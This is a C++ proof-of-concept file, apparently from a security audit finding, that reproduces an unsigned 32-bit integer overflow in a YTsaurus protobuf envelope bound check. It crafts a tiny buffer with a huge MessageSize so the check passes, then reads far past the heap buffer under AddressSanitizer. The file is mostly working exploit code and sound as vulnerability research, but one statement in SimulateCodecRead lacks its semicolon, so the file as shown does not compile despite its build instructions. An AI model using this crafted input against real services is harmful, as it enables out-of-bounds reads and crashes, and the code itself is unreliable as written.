// F1 — integer overflow in TryDeserializeProtoWithEnvelope
// Source: yt/yt/core/misc/protobuf_helpers.cpp:189,205
//
// MessageSize and EnvelopeSize are both ui32. Their sum is computed in
// unsigned 32-bit arithmetic and only then widened to size_t for the bound
// check. Choose values that wrap to a small number; the check passes; the
// subsequent TSharedRef covers ~4 GiB rooted past the end of `data`.
//
//   g++ -std=c++20 -fsanitize=address,undefined -O1 -g \
//       f1_envelope_overflow.cpp -o f1_envelope_overflow
//   ./f1_envelope_overflow
//
// Expected: ASAN reports heap-buffer-overflow READ inside SimulateCodecRead.

#include <cstdint>
#include <cstdio>
#include <cstring>

struct __attribute__((packed)) TEnvelopeFixedHeader {
    std::uint32_t EnvelopeSize;
    std::uint32_t MessageSize;
};
static_assert(sizeof(TEnvelopeFixedHeader) == 8);

struct TRef {
    const char* p;
    std::size_t n;
    const char* Begin() const { return p; }
    std::size_t Size() const { return n; }
};

// Verbatim arithmetic from protobuf_helpers.cpp.
static bool VulnerableTryDeserialize(TRef data, const char*& outPtr, std::size_t& outLen) {
    if (data.Size() < sizeof(TEnvelopeFixedHeader)) return false;

    TEnvelopeFixedHeader h;
    std::memcpy(&h, data.Begin(), sizeof(h));
    const char* sourceHeader = data.Begin() + sizeof(TEnvelopeFixedHeader);

    if (h.EnvelopeSize + sizeof(h) > data.Size()) return false;

    const char* sourceMessage = sourceHeader + h.EnvelopeSize;

    // L205 — broken: ui32 + ui32 wraps before widening.
    if (h.MessageSize + h.EnvelopeSize + sizeof(h) > data.Size()) return false;

    outPtr = sourceMessage;
    outLen = h.MessageSize;
    return true;
}

// Stand-in for codec->Decompress front-of-buffer reads.
static volatile std::uint8_t g_sink;
static void SimulateCodecRead(const char* p, std::size_t n) {
    if (n == 0) return;
    g_sink = static_cast<std::uint8_t>(p[0]);
    g_sink = static_cast<std::uint8_t>(p[n / 2]);
    g_sink = static_cast<std::uint8_t>(p[n - 1])
}

int main() {
    // [ui32 EnvelopeSize=3][ui32 MessageSize=0xFFFFFFFE][3 bytes envelope]
    // ui32 sum: 0xFFFFFFFE + 3 = 1 (wrap), + 8 = 9. data.Size() = 11.
    // 9 <= 11 → check passes. outLen returned as 0xFFFFFFFE.
    constexpr std::size_t kBufLen = sizeof(TEnvelopeFixedHeader) + 3;
    char* buf = new char[kBufLen];
    TEnvelopeFixedHeader h{};
    h.EnvelopeSize = 3;
    h.MessageSize  = 0xFFFFFFFEu;
    std::memcpy(buf, &h, sizeof(h));
    std::memset(buf + sizeof(h), 0, 3);

    TRef data{buf, kBufLen};

    const char* msgPtr = nullptr;
    std::size_t msgLen = 0;
    bool ok = VulnerableTryDeserialize(data, msgPtr, msgLen);

    std::printf("VulnerableTryDeserialize returned: %s\n", ok ? "true" : "false");
    std::printf("data.Size() = %zu, msgPtr offset past data.End() = %td\n",
                data.Size(),
                msgPtr - (data.Begin() + data.Size()));
    std::printf("attacker-supplied msgLen = 0x%zx (%zu bytes)\n", msgLen, msgLen);

    if (!ok) {
        std::fprintf(stderr, "FAIL: bound check rejected the input — overflow already fixed?\n");
        delete[] buf;
        return 2;
    }

    std::puts("Triggering simulated codec read on the OOB ref ...");
    SimulateCodecRead(msgPtr, msgLen);

    std::puts("UNREACHED — ASAN should have aborted before this line.");
    delete[] buf;
    return 0;
}
